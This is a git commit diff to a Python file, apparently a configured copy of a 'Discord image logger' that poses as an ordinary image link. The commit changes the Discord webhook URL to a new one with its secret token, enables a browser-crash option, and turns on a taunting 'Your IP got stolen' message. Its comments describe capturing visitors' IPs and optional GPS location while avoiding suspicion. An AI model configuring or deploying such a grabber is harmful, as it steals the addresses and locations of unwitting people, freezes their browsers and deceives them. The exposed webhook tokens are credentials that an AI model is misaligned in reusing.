155e8c7282cdab5c81d4f2af1de0e86b98fa67c5
ASD-dev69 <2000sean0828@gmail.com>
2025-02-14 13:27:26 +0900

    Update cute.py

--- api/cute.py
+++ api/cute.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1339790115362570282/US6VVeQZPMWmFTtEtwCOFZ7wkqNABYnQ7Eipx3DCIwf0zAgbb1tzzj37Sd1mevP137HS",
+    "webhook": "https://discord.com/api/webhooks/1339814232874553394/6l-pE-hQMxwTwRepP6eDHQ2ABFFIVUk1Z7z7v1gjXEurwNKans_JMoGLqpl-dK3Ujkq7",
     "image": "https://upload.wikimedia.org/wikipedia/commons/0/07/Francisco_Lachowski_2011.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -22,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Your IP got stolen gang", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
